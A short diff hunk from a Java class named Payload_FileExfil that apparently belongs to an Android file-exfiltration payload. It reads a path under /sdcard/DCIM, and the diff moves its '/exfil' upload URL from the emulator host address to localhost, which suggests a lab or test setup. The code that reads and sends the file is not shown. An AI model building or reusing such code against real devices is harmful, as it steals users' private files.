@@ -11,7 +11,7 @@ import java.net.URL;
 public class Payload_FileExfil {
     public void execute() {
         String filepath = "/sdcard/DCIM/sensitive.txt";  // example path
-        String serverUrl = "http://10.0.2.2:5000/exfil";  // change as needed
+        String serverUrl = "http://127.0.0.1:5000/exfil";  // change as needed
         StringBuilder contents = new StringBuilder();
 
         try {
